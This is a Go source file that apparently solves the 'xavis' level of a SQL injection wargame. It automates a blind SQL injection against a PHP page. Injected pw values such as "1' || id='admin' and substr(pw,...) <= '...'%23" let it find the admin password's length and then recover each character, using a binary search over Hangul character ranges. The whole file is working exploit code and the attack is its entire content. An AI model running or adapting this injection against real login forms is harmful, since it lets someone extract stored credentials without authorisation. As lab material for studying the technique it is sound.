package problem

import (
	"fmt"
	"strconv"
	"strings"
	"unicode"
)

func find_len6(file, session string) int{
	for length := 0 ; length < 50; length += 1 {
		s_pw := "1' || LENGTH(pw) = " + strconv.Itoa(length) + "; %23"
		param := map[string]string{
			"pw" : s_pw,
		}
		
		contents := connect(file, param, session)
		if strings.Contains(string(contents),"<h2>Hello admin</h2>"){
			return length
		}
	}
	return 0
}
func xavis_check(file, session string, pos int, chr uint16) bool {
	s_pw := "1' || id='admin' and substr(pw,"+strconv.Itoa(pos)+",1) <= '"+ string(chr) +"'%23"
	param := map[string]string{
		"pw" : s_pw,
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"<h2>Hello admin</h2>"){
		return true
	}
	return false
}

func bsearch(file, session string, pos int, lo, hi uint16) uint16 {
	if hi - lo == 1 {
		if xavis_check(file, session, pos, lo){
			return lo
		}
		return hi
	}
	center := lo + (hi - lo)/2
	if xavis_check(file, session, pos, center){
		return bsearch(file, session, pos, lo, center)
	}else{
		return bsearch(file, session, pos, center, hi)
	}
}

func find_pw6(file string, length int, session string)string{
	result := ""
	NEXT_STR:
	for i := 1 ; i <= length/2; i += 1 {
		for _, r := range unicode.Hangul.R16 {			
			if xavis_check(file, session, i, r.Lo) != false {
				continue
			}else if xavis_check(file, session, i, r.Hi) != true {
				continue
			}
			c := bsearch(file, session, i, r.Lo, r.Hi)
			result += string(c)
			continue NEXT_STR
		}
	}
	return result
}

func Xavis(session string){
	file := "xavis_a395c4d30bdb092b6f835ee7b4821aa3.php"
	
	length := find_len6(file, session)
	//fmt.Println("Key length is "+ strconv.Itoa(length) + ".")

	pw_str := find_pw6(file,length, session)
	//fmt.Println("pw is "+ pw_str + ".")
		
	param := map[string]string{
		"pw" : pw_str,
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"XAVIS Clear!"){
		fmt.Println("XAVIS Clear!")
	}
}